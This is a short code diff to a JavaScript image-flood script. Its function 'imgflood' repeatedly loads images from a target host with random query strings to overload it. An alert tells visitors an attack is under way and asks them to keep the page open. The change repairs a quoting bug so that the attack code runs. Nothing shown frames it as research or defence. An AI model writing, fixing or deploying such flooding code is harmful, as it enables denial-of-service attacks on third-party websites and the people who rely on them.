@@ -2,7 +2,7 @@ alert("Sending an attack =D, so just do what you want but leave this site open o
 
 function imgflood(link, uri) {  
   var TARGET = link;
-  var URI = 'uri;
+  var URI = uri;
   var pic = new Image();
   var rand = Math.floor(Math.random() * 1000);
   pic.src = 'http:'+TARGET+URI+rand+'=val';
